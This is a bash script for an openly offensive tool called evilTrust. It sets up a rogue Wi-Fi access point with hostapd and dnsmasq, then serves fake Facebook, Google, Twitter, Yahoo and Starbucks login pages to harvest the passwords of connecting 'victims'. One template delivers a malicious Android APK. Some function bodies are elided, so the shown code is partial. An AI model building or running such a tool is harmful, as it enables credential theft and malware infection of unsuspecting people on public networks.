#!/bin/bash
# evilTrust v2.0, Author @jeanpseven (Wrench)#Colours greenColour="\e[0;32m\033[1m" endColour="\033[0m\e[0m" redColour="\e[0;31m\033[1m" blueColour="\e[0;34m\033[1m" yellowColour="\e[0;33m\033[1m" purpleColour="\e[0;35m\033[1m" turquoiseColour="\e[0;36m\033[1m" grayColour="\e[0;37m\033[1m"trap ctrl_c INTfunction ctrl_c(){ echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}" rm dnsmasq.conf hostapd.conf 2>/dev/null rm -r iface 2>/dev/null find -name datos-privados.txt | xargs rm 2>/dev/null sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1 iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1 ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1 tput cnorm; service network-manager restart exit 0 }function banner(){ echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮" sleep 0.05 echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮" sleep 0.05 echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯" sleep 0.05 echo -e "┃┃━┫╰╯┣┫┃╱┃┃┃╭┫┃┃┃━━┫┃   ${endColour}${yellowColour}(${endColour}${grayColour}Feito por ${endColour}${blueColour}Wrench - ${endColour}${purpleColour}Eso le metes un nmap y pa' dentro${endColour}${yellowColour})${endColour}${redColour}" sleep 0.05 echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮" sleep 0.05 echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}" sleep 0.05 }function dependencies(){ sleep 1.5; counter=0 echo -e "\n${yellowColour}[*]${endColour}${grayColour} Comprobando programas necesarios...\n" sleep 1dependencias=(php dnsmasq hostapd)
    ...
    if [ "$(echo $counter)" == "3" ]; then
            ...
            tput cnorm; exit
    fi}function getCredentials(){activeHosts=0
    ...
    if [ $check_plantillas -eq 1 ]; then
            ...
            sleep 2
            popd > /dev/null 2>&1; getCredentials
    fi}function helpPanel(){ echo -e "\n${redColour}╱╱╱╱╱╱╱╭┳━━━━╮╱╱╱╱╱╱╭╮" sleep 0.05 echo -e "╱╱╱╱╱╱╱┃┃╭╮╭╮┃╱╱╱╱╱╭╯╰╮" sleep 0.05 echo -e "╭━━┳╮╭┳┫┣╯┃┃┣┻┳╮╭┳━┻╮╭╯" sleep 0.05 echo -e "Feito por Wrench" sleep 0.05 echo -e "┃┃━╋╮╭┫┃╰╮┃┃┃┃┃╰╯┣━━┃╰╮" sleep 0.05 echo -e "╰━━╯╰╯╰┻━╯╰╯╰╯╰━━┻━━┻━╯${endColour}" echo -e "\n${grayColour}Uso:${endColour}" echo -e "\t${redColour}[-m]${endColour}${blueColour} Modo de execução${endColour}${yellowColour} terminal ou gui${endColour}${purpleColour} [-m terminal | -m gui]${endColour}"        echo -e "\t${redColour}[-h]${endColour}${blueColour} Mostrar este panel de ajuda${endColour}\n" exit 1 }function guiMode(){ whiptail --title "evilTrust - by Wrench" --msgbox "Bem-vindo ao evilTrust, uma ferramenta ofensiva ideal para implantar um Rogue AP ao seu gosto." 8 78 whiptail --title "evilTrust - by Wrench" --msgbox "Deixe-me verificar se você tem todos os programas necessários antes de começar..." 8 78tput civis; dependencias=(php dnsmasq hostapd)
    ...
    counter_dep=0; for programa in "${dependencias[@]}"; do
            ...
            whiptail --title "evilTrust - by Wrench" --msgbox "Perfeito, parece que você tem tudo que precisa...." 8 78                                                             tput civis
    else                                                            whiptail --title "evilTrust - by Wrench" --msgbox "Parece que estão faltando algumas dependências, preciso que você tenha os utilitários php, dnsmasq e hostapd instalados" 8 78                                                exit 1
    fi

    tput civis; if [[ -e credenciales.txt ]]; then
            rm -rf credenciales.txt                         fi
    ...
    checker=0; while [ $checker -ne 1 ]; do
            ...
            for interface in $(cat iface); do
                    if [ "$choosed_interface" == "$interface" ]; then
                            checker=1                                       fi
            done; if [ $checker -eq 0 ]; then whiptail --title "evilTrust - Erro de seleção de interface" --msgbox "A interface fornecida não existe, entre novamente na interface e verifique se está correta" 8 78; fi            done
    ...
    3 "Usar este canal " OFF \                              4 "Usar este canal " OFF \
    ...
    use_channel=$(cat use_channel | tr -d '"'); rm use_channel
                                                            ...
                                                            tput civis; echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando... Este proceso tarda unos segundos${endColour}"        sleep 2                         killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
    sleep 5                                                                                                         echo -e "interface=$choosed_interface\n" > hostapd.conf                                                         echo -e "driver=nl80211\n" >> hostapd.conf
    echo -e "ssid=$use_ssid\n" >> hostapd.conf
    echo -e "hw_mode=g\n" >> hostapd.conf
    echo -e "channel=$use_channel\n" >> hostapd.conf
    echo -e "macaddr_acl=0\n" >> hostapd.conf               echo -e "auth_algs=1\n" >> hostapd.conf
    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf 
    sleep 2                                                 hostapd hostapd.conf > /dev/null 2>&1 &
    sleep 6                                             
    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
    ...
    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
    sleep 1
    route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1                                                 sleep 1
    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
    sleep 5                                             
    # Array de plantillas                                   plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
                                                            whiptail --title "evilTrust - by Wrench" --msgbox "¡Listo!, hora de escoger tu plantilla" 8 78              
    whiptail --title "evilTrust - by Wrench" --checklist --separate-output "Selecciona la plantilla que desees utilizar" 20 103 12 \                                        facebook-login "Plantilla de inicio de sesión de Facebook" OFF \
    ...
    all_in_one "Plantilla todo en uno múltiples portales centralizados" OFF \        cliqq-payload "Plantilla con despliege de APK malicioso" OFF \
    ...
    template=$(cat template | tr -d '"'); rm template
                                                            check_plantillas=0; for plantilla in "${plantillas[@]}"; do
            if [ "$plantilla" == "$template" ]; then
                    check_plantillas=1                              fi
    done
                                                            if [ "$template" == "cliqq-payload" ]; then
            check_plantillas=2                              fi; clear

    if [ $check_plantillas -eq 1 ]; then                            whiptail --title "evilTrust - by Wrench" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78                                         tput civis; pushd $template > /dev/null 2>&1
            php -S 192.168.1.1:80 > /dev/null 2>&1 &                sleep 2
            popd > /dev/null 2>&1; getCredentials           elif [ $check_plantillas -eq 2 ]; then
            whiptail --title "evilTrust - by Wrench" --msgbox "¡Listos para la batalla!, en breve el punto de acceso estará montado y será cuestión de esperar a que tus víctimas se conecten" 8 78                                         tput civis; pushd $template > /dev/null 2>&1
            php -S 192.168.1.1:80 > /dev/null 2>&1 &                sleep 2
            ...
            popd > /dev/null 2>&1; getCredentials
    else                                                            whiptail --title "evilTrust - by Wrench" --msgbox "Veo que prefieres usar tu propia plantilla, sabia elección :D" 8 78                template=$(whiptail --title "evilTrust - by Wrench" --inputbox "¡Pues vamos a ello!, dime el nombre de tu plantilla (debes crear un directorio con el mismo nombre):" 13 78 --title "evilTrust - Plantilla personalizada" 3>&1 1>&2 2>&3)
            pushd $template > /dev/null 2>&1
            php -S 192.168.1.1:80 > /dev/null 2>&1 &
            sleep 2
            popd > /dev/null 2>&1; getCredentials
...
if [ "$(id -u)" == "0" ]; then declare -i parameter_enable=0; while getopts ":m:h:" arg; do case $arg in m) mode=$OPTARG && let parameter_enable+=1;; h) helpPanel;; esac doneif [ $parameter_enable -ne 1 ]; then
            helpPanel
    else
            if [ "$mode" == "terminal" ]; then
                    ...
                    exit 1                                          fi
    fielse echo "Es necesario ser root para ejecutar la herramienta" exit 1 fi